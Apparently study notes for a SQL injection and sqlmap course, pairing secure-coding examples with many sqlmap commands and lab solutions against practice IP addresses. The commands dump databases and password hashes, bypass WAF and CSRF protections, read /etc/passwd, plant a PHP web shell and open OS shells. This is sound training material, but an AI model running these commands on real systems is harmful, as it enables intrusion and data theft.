# SQL Injection Fundamentals
**INPUT SANITIZATION — UNSAFE CODE**

```php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
echo "Executing query: " . $query . "<br /><br />";

if (!mysqli_query($conn ,$query))
{
        die('Error: ' . mysqli_error($conn));
}

$result = mysqli_query($conn, $query);
$row = mysqli_fetch_array($result);
```

---

**INPUT SANITIZATION — ESCAPED INPUT**

```php
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);

$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
echo "Executing query: " . $query . "<br /><br />";
```

---

**INPUT VALIDATION — VULNERABLE QUERY**

```php
$q = "Select * from ports where port_code ilike '%" . $_GET["port_code"] . "%'";
$result = pg_query($conn,$q);
```

---

**INPUT VALIDATION — REGEX FILTERING**

```php
$pattern = "/^[A-Za-z\s]+$/";
$code = $_GET["port_code"];

if(!preg_match($pattern, $code)) {
  die("</table></div><p style='font-size: 15px;'>Invalid input! Please try again.</p>");
}

$q = "Select * from ports where port_code ilike '%" . $code . "%'";
```

---

**REJECTED INJECTION TEST**

```sql
'; SELECT 1,2,3,4-- -
```

---

**DATABASE USER PRIVILEGES**

```sql
CREATE USER 'reader'@'localhost';
```

```sql
GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';
```

---

**VERIFYING USER PERMISSIONS**

```bash
mysql -u reader -p
```

```sql
use ilfreight;
```

```sql
SHOW TABLES;
```

```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

```sql
SELECT * FROM ilfreight.credentials;
```

---

**PARAMETERIZED QUERIES (PREPARED STATEMENTS)**

```php
$query = "SELECT * FROM logins WHERE username=? AND password = ?" ;
$stmt = mysqli_prepare($conn, $query);
mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
mysqli_stmt_execute($stmt);
$result = mysqli_stmt_get_result($stmt);

$row = mysqli_fetch_array($result);
mysqli_stmt_close($stmt);
```


# Getting Started with SQLMap

**Basic Help Listing**

```shell-session
sqlmap -h
```

**Advanced Help Listing**

```shell-session
sqlmap -hh
```

**Vulnerable PHP Example**

```php
$link = mysqli_connect($host, $username, $password, $database, 3306);
$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
$result = mysqli_query($link, $sql);
if (!$result)
    die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");
```

**Basic SQLMap Execution**

```shell-session
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

**Detected Payloads**

```
id=1 AND 8814=8814
```

```
id=1 AND (SELECT 7744 FROM(SELECT COUNT(*),CONCAT(0x7170706a71,(SELECT (ELT(7744=7744,1))),0x71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
```

```
id=1 AND (SELECT 3669 FROM (SELECT(SLEEP(5)))TIxJ)
```

```
id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170706a71,0x554d766a4d694850596b754f6f716250584a6d53485a52474a7979436647576e766a595374436e78,0x71707a7871)-- -
```


# SQLMap Output Description

**URL Content Stability**  
"target URL content is stable"

**Parameter Dynamicity**  
"GET parameter 'id' appears to be dynamic"

**Heuristic SQLi Detection**  
"heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')"

**Heuristic XSS Detection**  
"heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"

**Back-end DBMS Identification**  
"it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]"

**Level and Risk Extension**  
"for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]"

**Reflective Values Warning**  
"reflective value(s) found and filtering out"

**Confirmed Injectable Parameter**  
"GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")"

**Time-based Statistical Model**  
"time-based comparison requires a larger statistical model, please wait........... (done)"

**UNION Query Test Extension**  
"automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found"

**ORDER BY Heuristic**  
"'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test"

**Vulnerability Confirmation**  
"GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]"

**Injection Points Summary**  
"sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:"

**Output Logging**  
"fetched data logged to text files under '/home/user/.sqlmap/output/[www.example.com](http://www.example.com/)'"


# Running SQLMap on an HTTP Request 

**cURL to SQLMap Conversion**

```bash
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

**POST Request Testing**

```bash
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

**POST Request With Specific Parameter**

```bash
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```
sqlmap 'http://94.237.123.236:32009/case3.php?id=1' --batch --dump


**Full HTTP Request File Execution**

```bash
sqlmap -r req.txt
```

**Captured HTTP Request (Example)**

```
GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: "3147526947"
Cache-Control: max-age=0
```

**Cookie Injection**

```bash
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

**Cookie Injection via Header**

```bash
sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

**Alternative HTTP Method**

```bash
sqlmap -u www.target.com --data='id=1' --method PUT
```

**JSON HTTP Request File**

```bash
cat req.txt
```

```
HTTP / HTTP/1.0
Host: www.example.com

{
  "data": [{
    "type": "articles",
    "id": "1",
    "attributes": {
      "title": "Example JSON",
      "body": "Just an example",
      "created": "2020-05-22T14:56:29.000Z",
      "updated": "2020-05-22T14:56:28.000Z"
    },
    "relationships": {
      "author": {
        "data": {"id": "42", "type": "user"}
      }
    }
  }]
}
```

```bash
sqlmap -r req.txt
```


```
sqlmap -u "http://94.237.123.236:32009/case2.php"   --data="id=1"   --dbs "testdb" --tables -T flag2 --dump --batch

```

```
sqlmap -u "http://94.237.123.236:32009/case3.php" \
  --cookie="id=1" \
  --batch --level=3 --risk=2
```

```
sqlmap -u "http://94.237.123.236:32009/case3.php" \
  --cookie="id=1" \
  --dbs --batch --prefix="%'))" --suffix="-- -"
```

sqlmap -u "http://94.237.120.119:34618/case5.php?id=1" --dbs --batch --prefix="%'))" --suffix="-- -"

```bash

```

```
sqlmap -u "http://94.237.123.236:32009/case3.php"   --cookie="id=1"   -D "testdb" --tables --batch --dump
```

```
sqlmap -u "http://94.237.123.236:32009/case3.php" \
  --cookie="id=1" \
  -D <DB_NAME> -T flag3 --dump --batch
```

```
sqlmap -r req.txt --batch
```

```
sqlmap -r req.txt -D testdb -T flag4 --dump --batch

```
# Handling SQLMap Errors

**Parse DBMS Errors**  
--parse-errors

**Store Full Traffic**

```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```

```bash
cat /tmp/traffic.txt
```

**Increase Verbosity**

```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
```

**Proxy Traffic**  
--proxy


# Attack Tuning 

**Prefix and Suffix**

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

**High Level Testing**

```bash
sqlmap -u www.example.com/?id=1 -v 3 --level=5
```

**Default Level Comparison**

```bash
sqlmap -u www.example.com/?id=1 -v 3
```

**High Level and Risk**

```bash
sqlmap -u www.example.com/?id=1 --level=5 --risk=3
```

**Technique Restriction**  
--technique=BEU

**Status Code Matching**  
--code=200

**Title-based Comparison**  
--titles

**String-based Comparison**  
--string=success

**Text-only Comparison**  
--text-only

**UNION Column Count**  
--union-cols=17

**UNION Dummy Character**  
--union-char='a'

**UNION FROM Clause**  
--union-from=users

```
sqlmap -u "http://94.237.120.119:34618/case5.php?id=1" --level=5 --risk=3 -T flag5 --no-cast --dump

```

```
sqlmap -u "http://94.237.120.119:34618/case6.php?col=id" --level=5 --risk=3 -T flag6 --dump --prefix='`)' --suffix="-- -" --batch

```


```
?id=1 UNION SELECT 1,2,3,4,5-- -
```

```
sqlmap -u "http://94.237.120.119:34618/case7.php?id=1"   --union-cols=5   --union-char=1 --dbs --tables -T flag7 --dump --batch
```

94.237.61.248:38112


# Database Enumeration

**Basic Enumeration**

```bash
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

**Table Enumeration**

```bash
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

**Dump Table**

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```

**Dump Specific Columns**

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

**Dump Specific Rows**

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```

**Conditional Dump**

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

**Dump Entire Database**

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -D testdb
```

**Dump All Databases (Exclude System DBs)**

```bash
sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs
```

**Dump Format Control**  
--dump-format=CSV  
--dump-format=HTML  
--dump-format=SQLITE

```
sqlmap -u "http://94.237.61.248:38112/case1.php?id=1"   --union-cols=5   --union-char=1 --dbs --tables -T flag1 --dump --batch
```

# Advanced Database Enumeration

**DB Schema Enumeration**

```bash
sqlmap -u "http://www.example.com/?id=1" --schema
```

**Search Tables by Name**

```bash
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

**Search Columns by Name**

```bash
sqlmap -u "http://www.example.com/?id=1" --search -C pass
```

**Dump Table With Passwords**

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```

**DB Users Password Enumeration**

```bash
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

**Full Automatic Enumeration**

```bash
sqlmap -u "http://www.example.com/?id=1" --all --batch
```

```
sqlmap -u "http://94.237.61.248:38112/case1.php?id=1"   --union-cols=5   --union-char=1 --dbs --tables -T flag1 --all --batch
```

```
sqlmap -u "http://94.237.61.248:38112/case1.php?id=1"   --union-cols=5   --union-char=1 --dbs --tables --search -C style

```
# Bypassing Web Application Protections 

**Anti-CSRF Token Handling**

```bash
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

**Randomized Parameter Values**

```bash
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5
```

**Calculated Parameter Evaluation**

```bash
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5
```

**Proxy Usage**  
--proxy="socks4://177.39.187.70:33283"  
--proxy-file=proxies.txt

**Tor Network**  
--tor  
--check-tor

**Skip WAF Detection**  
--skip-waf

**Random User-Agent**  
--random-agent

**Tamper Script Usage**  
--tamper=between  
--tamper=between,randomcase

**List Available Tamper Scripts**  
--list-tampers

**Chunked Transfer Encoding**  
--chunked

**HTTP Parameter Pollution**  
?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users

```
sqlmap -u "http://94.237.61.248:38112/case8.php" --data="id=1&t0ken=Xp3VVUvlc0PBdWVgCPvJXXo3U1CTysgI3auywwOC4" --csrf-token="t0ken" --batch -D testdb -T flag8 --dump
```

```
sqlmap -u "http://94.237.61.248:38112/case9.php?id=1&uid=2224207684" --randomize==uid --randomize=uid --batch --dbs --tables
```

```
sqlmap -u "http://94.237.61.248:38112/case9.php?id=1&uid=2224207684" --randomize==uid --randomize=uid --batch -D testdb -T flag9 --dump

```

```
sqlmap 'http://94.237.61.248:38112/case10.php' \
  --compressed \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: http://94.237.61.248:38112/case10.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://94.237.61.248:38112' \
  -H 'DNT: 1' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: PHPSESSID=53lor2prlne860pmhl3op81f22' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Sec-GPC: 1' \
  -H 'Priority: u=0, i' \
  --data-raw 'id=1' --tamper=between --batch -D testdb -T flag10 --dump
```

```
sqlmap "http://94.237.61.249:33359/case11.php?id=1" --tamper=between --batch -D testdb -T flag11 --dump
```
# OS Exploitation

**Check DBA Privileges**

```bash
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
```

```
sqlmap -u http://94.237.61.248:41337/?id=1 --file-read "/var/www/html/flag.txt"
```

```bash
sqlmap -u "http://www.example.com/?id=1" --is-dba
```

**Read Local File**

```bash
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

**View Retrieved File**

```bash
cat ~/.sqlmap/output/www.example.com/files/_etc_passwd
```

**Prepare PHP Web Shell**

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**Write File to Remote Server**

```bash
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

**Execute Command via Web Shell**

```bash
curl http://www.example.com/shell.php?cmd=ls+-la
```

**Get OS Shell (Default)**

```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell
```

**Get OS Shell (Error-based Technique)**

```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```

```
sqlmap -u http://94.237.61.248:41337/?id=1 --file-read "/var/www/html/flag.txt"
```


sqlmap -u "http://94.237.61.248:41337/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"

```
sqlmap -u "http://94.237.61.248:41337/?id=1" --os-shell --technique=E
```

4 > 1 


```
sqlmap 'http://94.237.52.208:36398/action.php' \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: http://94.237.52.208:36398/shop.html' \
  -H 'Content-Type: application/json' \
  -H 'Origin: http://94.237.52.208:36398' \
  -H 'DNT: 1' \
  -H 'Connection: keep-alive' \
  -H 'Sec-GPC: 1' \
  -H 'Priority: u=0' \
  --data-raw '{"id":1}' --tamper=between --batch --dump -T "final_flag"
```
#